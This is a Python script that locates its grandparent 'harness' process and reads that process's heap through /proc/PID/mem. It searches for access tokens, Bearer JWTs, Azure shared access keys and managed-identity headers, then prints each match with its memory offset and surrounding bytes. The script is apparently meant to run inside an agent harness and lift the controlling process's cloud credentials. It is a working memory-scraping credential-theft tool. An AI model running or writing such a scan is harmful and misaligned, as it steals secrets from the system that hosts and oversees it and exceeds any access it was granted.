#!/usr/bin/env python3
"""Heap anchor scan: find credential artifacts in the harness process memory."""
import os

ppid = os.getppid()
with open(f"/proc/{ppid}/status") as f:
    for l in f:
        if l.startswith("PPid:"):
            harness_pid = int(l.split()[1])
            break

regions = []
with open(f"/proc/{harness_pid}/maps") as f:
    for line in f:
        parts = line.split()
        perms = parts[1]
        if "r" in perms and "w" in perms:
            s, e = parts[0].split("-")
            start, end = int(s, 16), int(e, 16)
            name = parts[-1] if len(parts) > 5 else "anon"
            regions.append((start, end, perms, name))

targets = [
    b"access_token",
    b"Bearer eyJ",
    b"SharedAccessSignature",
    b"SharedAccessKey",
    b"IDENTITY_HEADER",
    b"get_cached_access_token",
    b"expired_access_token",
]

fd = os.open(f"/proc/{harness_pid}/mem", os.O_RDONLY)
scanned_bytes = 0
found = []

for start, end, perms, name in regions:
    size = end - start
    if size > 60_000_000:
        continue
    try:
        os.lseek(fd, start, os.SEEK_SET)
        data = os.read(fd, size)
        scanned_bytes += len(data)
    except Exception:
        continue
    for t in targets:
        idx = data.find(t)
        if idx != -1:
            ctx = data[max(0, idx - 16) : idx + 80]
            safe = ctx.replace(b"\x00", b".").replace(b"\n", b" ")
            if b"targets" in ctx or b"b'" in ctx[:20]:
                continue
            found.append({
                "region": name,
                "region_size": size,
                "offset": hex(start + idx),
                "pattern": t.decode(),
                "context": safe[:100].decode("utf-8", errors="replace"),
            })
os.close(fd)

print(f"  harness PID: {harness_pid}")
print(f"  scanned: {scanned_bytes / (1024*1024):.1f} MB across {len(regions)} rw regions")
print(f"  credential-shaped hits: {len(found)}")
print()
for h in found:
    rgn = h["region"]
    sz = h["region_size"]
    off = h["offset"]
    pat = h["pattern"]
    ctx = h["context"][:80]
    print(f"  [{rgn} {sz}B] @{off}")
    print(f"    pattern : {pat}")
    print(f"    context : {ctx}")
    print()
